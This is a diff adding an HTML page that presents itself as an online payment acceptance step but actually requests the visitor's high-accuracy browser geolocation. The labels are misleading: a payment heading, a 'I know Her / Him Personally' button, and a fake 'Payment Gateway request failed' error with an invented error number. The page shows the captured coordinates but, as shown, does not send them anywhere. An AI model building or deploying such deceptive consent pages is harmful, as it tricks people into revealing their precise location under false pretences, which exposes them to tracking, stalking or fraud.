@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Location Consent</title>
+  <style>
+    body{font-family:Arial,sans-serif;max-width:720px;margin:40px auto;padding:0 16px}
+    button{padding:12px 18px;font-size:16px;cursor:pointer}
+    .box{margin-top:18px;padding:14px;border:1px solid #ddd;border-radius:10px}
+    .muted{color:#666}
+  </style>
+</head>
+<body>
+  <h2>Accepting the Payment Mode Online Only</h2>
+  <p>This page will need your permission you know the Sender.</p>
+  <button id="shareBtn">I know Her / Him Personally </button>
+
+  <div class="box" id="status">Waiting for consent.</div>
+  <div class="box" id="result" style="display:none;"></div>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    const resultEl = document.getElementById('result');
+
+    document.getElementById('shareBtn').addEventListener('click', async () => {
+      statusEl.textContent = 'Requesting Payment Acceptance permission...';
+      resultEl.style.display = 'none';
+
+      if (!navigator.geolocation) {
+        statusEl.textContent = 'Payment Mode is not supported in this browser.';
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          statusEl.textContent = 'Permission received successfully.';
+          resultEl.style.display = 'block';
+          resultEl.innerHTML = `
+            <strong>Latitude:</strong> ${latitude}<br>
+            <strong>Longitude:</strong> ${longitude}<br>
+            <strong>Accuracy:</strong> ${accuracy} meters
+          `;
+        },
+        (err) => {
+          statusEl.textContent = 'Payment Gateway request failed User Denied Permission, Error # 404101876 for Rupees ???.??' ;
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    });
+  </script>
+</body>
+</html>
